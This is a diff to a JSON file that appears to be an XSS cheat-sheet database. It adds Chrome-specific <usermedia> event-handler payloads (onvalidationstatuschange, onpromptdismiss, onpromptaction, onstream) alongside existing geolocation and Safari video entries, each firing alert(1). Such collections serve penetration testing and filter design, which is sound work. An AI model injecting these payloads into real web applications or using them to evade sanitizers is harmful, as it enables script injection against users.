@@ -6472,6 +6472,12 @@
         "code": "<geolocation onvalidationstatuschange=alert(1)>",
         "browsers": ["chrome"],
         "interaction": false
+      },
+      {
+        "tag": "usermedia",
+        "code": "<usermedia onvalidationstatuschange=alert(1)>",
+        "browsers": ["chrome"],
+        "interaction": false
       }
     ]
   },
@@ -6483,6 +6489,12 @@
         "code": "<geolocation onpromptdismiss=alert(1)>",
         "browsers": ["chrome"],
         "interaction": true
+      },
+      {
+        "tag": "usermedia",
+        "code": "<usermedia onpromptdismiss=alert(1)>",
+        "browsers": ["chrome"],
+        "interaction": true
       }
     ]
   },
@@ -6492,6 +6504,12 @@
       {
         "tag": "geolocation",
         "code": "<geolocation onpromptaction=alert(1)>",
+        "browsers": ["chrome"],
+        "interaction": true
+      },
+      {
+        "tag": "usermedia",
+        "code": "<usermedia onpromptaction=alert(1)>",
         "browsers": ["chrome"],
         "interaction": true
       }
@@ -6522,6 +6540,17 @@
         "code": "<video src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></video>",
         "browsers": ["safari"],
         "interaction": false
+      }
+    ]
+  },
+  "onstream": {
+    "description": "Fires when the user grants permission",
+    "tags": [
+      {
+        "tag": "usermedia",
+        "code": "<usermedia onstream=alert(1)>",
+        "browsers": ["chrome"],
+        "interaction": true
       }
     ]
   }
